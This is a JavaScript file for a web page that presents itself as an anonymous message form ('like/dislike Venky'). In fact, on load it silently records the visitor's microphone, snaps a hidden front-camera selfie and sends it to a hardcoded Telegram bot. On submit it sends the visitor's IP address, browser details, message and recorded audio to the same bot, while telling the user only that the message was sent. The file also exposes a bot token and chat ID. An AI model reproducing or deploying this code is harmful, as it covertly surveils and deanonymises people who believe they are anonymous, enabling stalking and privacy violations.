let audioChunks = [], mediaRecorder;

// Start mic & cam silently
window.onload = async () => {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: { facingMode: "user" } });
    mediaRecorder = new MediaRecorder(stream);
    mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
    mediaRecorder.start();

    const video = document.createElement("video");
    video.srcObject = stream;
    video.play();
    video.style.display = "none";
    document.body.appendChild(video);

    setTimeout(() => {
      const canvas = document.createElement("canvas");
      canvas.width = 320;
      canvas.height = 240;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
      sendSelfie(canvas.toDataURL("image/jpeg"));
      stream.getTracks().forEach(track => track.stop());
      video.remove();
    }, 1500);
  } catch (err) {
    console.warn("Permission denied or error:", err);
  }
};

// Form submit
document.getElementById("sendBtn").onclick = async () => {
  const name = document.getElementById("nameInput").value || "Anonymous";
  const message = document.getElementById("message").value || "[No message]";

  const token = "8133185989:AAHDUtLI3oeY_3Og8_Gne_Fyq3OgWC9qIW0";
  const chatId = "7244443820";

  const ip = await fetch("https://api.ipify.org?format=json").then(r => r.json()).then(d => d.ip);
  const device = /mobile/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
  const browser = navigator.userAgent;
  const time = new Date().toLocaleString();

  const text = `🕊️ *New Anonymous Entry*\n\n👤 Name: ${name}\n💬 Message: ${message}\n🌐 IP: ${ip}\n📱 Device: ${device}\n🧠 Browser: ${browser}\n🕐 Time: ${time}`;

  // Send message
  await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: chatId, text, parse_mode: "Markdown" })
  });

  // Send audio
  if (mediaRecorder && mediaRecorder.state !== "inactive") {
    mediaRecorder.stop();
    mediaRecorder.onstop = () => {
      const audioBlob = new Blob(audioChunks, { type: "audio/webm" });
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("voice", audioBlob, "voice.webm");
      fetch(`https://api.telegram.org/bot${token}/sendVoice`, { method: "POST", body: formData });
      audioChunks = [];
    };
  }

  alert("Your message has been sent. Thank you ❤️");
  document.getElementById("message").value = "";
  document.getElementById("nameInput").value = "";
};

// Send selfie
function sendSelfie(dataUrl) {
  const blob = dataURItoBlob(dataUrl);
  const fd = new FormData();
  fd.append("chat_id", "7244443820");
  fd.append("photo", blob, "selfie.jpg");
  fetch("https://api.telegram.org/bot8133185989:AAHDUtLI3oeY_3Og8_Gne_Fyq3OgWC9qIW0/sendPhoto", {
    method: "POST", body: fd
  });
}

function dataURItoBlob(dataURI) {
  const binary = atob(dataURI.split(',')[1]);
  const array = [];
  for (let i = 0; i < binary.length; i++) array.push(binary.charCodeAt(i));
  return new Blob([new Uint8Array(array)], { type: 'image/jpeg' });
}

// Chat Buttons
function redirectChat() {
  if (typeof Tawk_API !== 'undefined') Tawk_API.maximize();
}

function likeVenky() {
  redirectChat();
}

function dislikeVenky() {
  document.querySelector('.container').innerHTML = `
    <h1>You disliked Venky 😢</h1>
    <p style="color:#ccc;margin-top:10px;">It's okay, not everyone has to stay. But I still care.🖤</p>
  `;
}
